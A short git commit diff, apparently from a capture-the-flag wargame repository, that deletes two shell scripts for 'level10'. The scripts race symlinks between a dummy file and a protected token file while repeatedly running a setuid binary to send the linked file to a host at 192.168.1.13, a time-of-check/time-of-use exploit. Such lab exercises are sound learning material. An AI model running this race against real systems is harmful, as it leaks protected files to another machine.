c93cfd4ff8de333f735a92efb838ed0359441832
Florian Cadet <cadet.florian@gmail.com>
2021-08-12 14:18:49 +0200

    modif before correction

--- level10/Ressources/replacer.sh
+++
@@ -1,9 +0,0 @@
-#!/bin/bash
-
-touch /tmp/file
-
-while true
-do
-	ln -sf /tmp/file /tmp/file.ln 2>/dev/null
-	ln -sf /home/user/level10/token /tmp/file.ln 2>/dev/null
-done
--- level10/Ressources/sender.sh
+++
@@ -1,6 +0,0 @@
-#!/bin/bash
-
-while true
-do
-	/home/user/level10/level10 /tmp/file.ln "192.168.1.13" &>/dev/null
-done
